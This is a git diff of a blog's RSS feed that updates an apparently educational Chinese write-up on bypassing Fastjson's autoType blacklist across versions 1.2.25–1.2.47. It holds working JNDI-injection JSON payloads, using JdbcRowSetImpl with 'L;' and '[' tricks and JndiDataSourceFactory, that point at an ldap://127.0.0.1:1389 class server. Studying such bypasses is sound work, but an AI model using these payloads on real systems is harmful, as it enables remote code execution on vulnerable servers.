@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Tue, 15 Nov 2022 08:58:35 &#43;0800</lastBuildDate>
+        <lastBuildDate>Tue, 15 Nov 2022 11:25:46 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://klearcc.github.io/rss.xml" />
         
@@ -216,7 +216,7 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 &lt;li&gt;如果关闭autoType，则会先匹配黑名单，再匹配白名单&lt;/li&gt;
 &lt;li&gt;如果开启autoType，使用typeUtils.loadClass加载&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h4 id=&#34;绕过&#34;&gt;绕过&lt;/h4&gt;
+&lt;h4 id=&#34;绕过需开启autotypesupport&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h4&gt;
 &lt;p&gt;这里就出现逻辑问题了，在开启autoType时，只要黑名单匹配不到就可以使用typeUtils.loadClass加载
 再看看typeUtils.loadClass
 如果className是以L开头，分号结尾的话直接删掉。&lt;/p&gt;
@@ -235,7 +235,7 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141432153.png&#34; alt=&#34;image-20221114143249113&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;逻辑-1&#34;&gt;逻辑&lt;/h4&gt;
 &lt;p&gt;checkAutoType中，如果匹配到className的第一个字符是L和最后一个字符是分号的话，使用substring截取className的第二位到倒数第二位&lt;/p&gt;
-&lt;h4 id=&#34;绕过-1&#34;&gt;绕过&lt;/h4&gt;
+&lt;h4 id=&#34;绕过需开启autotypesupport-1&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h4&gt;
 &lt;p&gt;因为使用substring截取className的第二位到倒数第二位，双写 L和分号 即可绕过&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
     &amp;#34;@type&amp;#34;:&amp;#34;LLcom.sun.rowset.JdbcRowSetImpl;;&amp;#34;,
@@ -252,14 +252,28 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 很明显@type值最前面添加&lt;code&gt;[&lt;/code&gt;即可，添加后提示第46个字符缺少&lt;code&gt;[&lt;/code&gt;
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150847088.png&#34; alt=&#34;image-20221115084717042&#34;&gt;
 添加后提示第50个字符缺少&lt;code&gt;{&lt;/code&gt;
-&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png&#34; alt=&#34;image-20221115084846839&#34;&gt;
-最终payload&lt;/p&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png&#34; alt=&#34;image-20221115084846839&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;绕过需开启autotypesupport-2&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h4&gt;
+&lt;p&gt;payload&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{ 
   &amp;#34;@type&amp;#34;: &amp;#34;[com.sun.rowset.JdbcRowSetImpl&amp;#34;[,
   {&amp;#34;dataSourceName&amp;#34;: &amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;,
   &amp;#34;autoCommit&amp;#34;: true&amp;#34;
 }
-&lt;/code&gt;&lt;/pre&gt;</description>
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastjson-1244&#34;&gt;Fastjson-1.2.44&lt;/h2&gt;
+&lt;h4 id=&#34;修复-3&#34;&gt;修复&lt;/h4&gt;
+&lt;p&gt;对上个版本中使用&lt;code&gt;[&lt;/code&gt;绕过的问题进行了修复，到这个版本字符绕过黑名单的方式暂时告一段落
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211151014721.png&#34; alt=&#34;image-20221115101443630&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1225fastjson1245&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.45&lt;/h2&gt;
+&lt;p&gt;黑名单：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&lt;/p&gt;
+&lt;h4 id=&#34;绕过需开启autotypesupport-3&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h4&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{ 
+    &amp;#34;@type&amp;#34;:&amp;#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&amp;#34;,
+    &amp;#34;properties&amp;#34;:{&amp;#34;data_source&amp;#34;:&amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastjson-1247&#34;&gt;Fastjson-1.2.47&lt;/h2&gt;
+</description>
                 
                 
                 
